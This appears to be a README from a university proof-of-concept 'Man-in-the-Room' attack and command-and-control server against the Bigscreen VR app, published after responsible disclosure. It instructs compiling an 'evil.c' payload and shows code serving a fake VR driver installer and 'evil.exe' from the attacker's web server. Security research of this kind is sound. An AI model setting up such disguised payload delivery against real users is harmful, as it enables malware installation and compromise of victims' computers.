<!--
Man-in-the-Room Attack and Command & Control Server Proof of Concept — Bigscreen

Vondracek Martin mvondracek vondracek.mar@gmail.com

Security and Forensics of Immersive Virtual Reality Social Applications
Cyber Forensics Research & Education Group                 https://www.unhcfreg.com/
Tagliatela College of Engineering                          https://www.newhaven.edu/engineering/
University of New Haven                                    https://www.newhaven.edu
300 Boston Post Rd, West Haven, CT 06516

DISCLAIMER: This software is a part of the cyber forensic research carried out by the research group UNHcFREG @ TCoE
at the University of New Haven, CT, USA. This software was developed as a proof of concept Man-in-the-Room attack.
Details concerning the research were kept private, the software vendor (Bigscreen, Inc.) was then contacted during
responsible disclosure. No harm has been done to the official infrastructure and users. Authors assume no liability
and are not responsible for any misuse or damage caused by this software. This software is intended as a proof
of concept only. The end user of this software agrees to use this software for education and research purposes only.

 -->
 # Payloads

Compile source code according to payload variables in `/control-panel/index.html`. For example `cl evil.c`.

```javascript
const fakeDriverUrl = webServerUrl + 'payloads/VR_driver_0.34.0.exe';
const evilPayloadUrl = webServerUrl + 'payloads/evil.exe';
```
